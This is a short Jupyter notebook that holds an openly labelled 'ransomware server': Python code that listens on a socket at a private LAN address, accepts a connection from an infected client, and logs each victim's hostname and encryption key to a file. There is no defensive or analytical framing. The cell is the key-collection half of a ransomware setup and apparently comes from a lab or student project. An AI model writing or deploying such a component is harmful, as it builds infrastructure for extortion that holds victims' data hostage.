{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "\n",
    "# connect to ransomware server to transfer key and hostname\n",
    "ipaddr = '192.168.160.138' # computers ipv4 address\n",
    "port = 5678\n",
    "\n",
    "# Create a socket and bind it to the given IP address and port\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "s.bind((ipaddr, port))\n",
    "\n",
    "# Listen for incoming connections\n",
    "print('Listening for connections.........')\n",
    "s.listen(1)\n",
    "\n",
    "# Accept the incoming connection\n",
    "conn, addr = s.accept()\n",
    "print(f'Connection from {addr} established!')\n",
    "\n",
    "# Receive the hostname and key from the client\n",
    "host_and_key = conn.recv(1024).decode()\n",
    "\n",
    "# Append the hostname and key to the encrypted_hosts.txt file\n",
    "with open('encrypted_hosts.txt', 'a') as f:\n",
    "    f.write(host_and_key+'\\n')\n",
    "\n",
    "# Close the connection\n",
    "print('Connection completed and closed!')\n",
    "conn.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "4a2365cc9973f15c638ee603b3a7e6accec4ebdade2354b699a9686e8d003b90"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
